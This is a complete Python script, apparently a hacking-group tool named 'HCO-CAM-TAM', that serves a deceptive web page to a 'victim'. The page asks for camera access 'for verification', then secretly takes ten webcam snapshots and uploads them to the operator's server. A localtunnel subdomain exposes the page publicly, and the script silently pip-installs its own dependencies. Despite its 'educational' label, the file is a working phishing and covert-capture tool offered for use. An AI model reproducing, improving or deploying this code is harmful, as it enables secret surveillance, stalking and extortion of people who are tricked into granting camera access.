#!/usr/bin/env python3
"""
HCO-CAM-TAM
By Azhar (Hackers Colony)
Educational Camera Capture Tool
"""

import os
import time
import subprocess
from flask import Flask, render_template_string, request
import cv2

# Auto-install dependencies if missing
os.system("pip install flask colorama opencv-python-headless localtunnel -q")

from colorama import Fore, Style

# Flask app
app = Flask(__name__)

# HTML page for victim
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
<title>Camera Access</title>
</head>
<body style="background:black; color:white; text-align:center;">
<h1>📷 Allow Camera Access</h1>
<p>We need camera permission for verification.</p>
<video id="video" width="320" height="240" autoplay></video>
<script>
navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{
    let video=document.getElementById("video");
    video.srcObject=stream;
    let count=0;
    let track=stream.getTracks()[0];
    let canvas=document.createElement("canvas");
    let context=canvas.getContext("2d");

    let interval=setInterval(()=>{
        if(count>=10){ clearInterval(interval); track.stop(); return;}
        canvas.width=320; canvas.height=240;
        context.drawImage(video,0,0,320,240);
        fetch('/upload?i='+count,{method:'POST',body:canvas.toDataURL('image/png')});
        count++;
    },2000);
});
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/upload", methods=["POST"])
def upload():
    img_data = request.data.decode().split(",")[1]
    import base64
    img = base64.b64decode(img_data)
    fname = f"captured_{int(time.time())}.png"
    with open(fname, "wb") as f:
        f.write(img)
    print(Fore.GREEN + f"[+] Image saved: {fname}" + Style.RESET_ALL)
    return "OK"

# Run tunnel automatically
def start_tunnel():
    print(Fore.RED + Style.BRIGHT + "\n\n       HCO CAM TAM" + Style.RESET_ALL)
    print(Fore.GREEN + Style.BRIGHT + "          By Azhar\n" + Style.RESET_ALL)
    print(Fore.YELLOW + "[*] Starting server and tunnel..." + Style.RESET_ALL)
    
    subprocess.Popen(["python3", __file__, "runserver"])
    time.sleep(2)
    
    # Start localtunnel
    os.system("lt --port 5000 --subdomain hcocamtam")

if __name__ == "__main__":
    import sys
    if len(sys.argv)>1 and sys.argv[1]=="runserver":
        app.run(host="0.0.0.0", port=5000)
    else:
        start_tunnel()
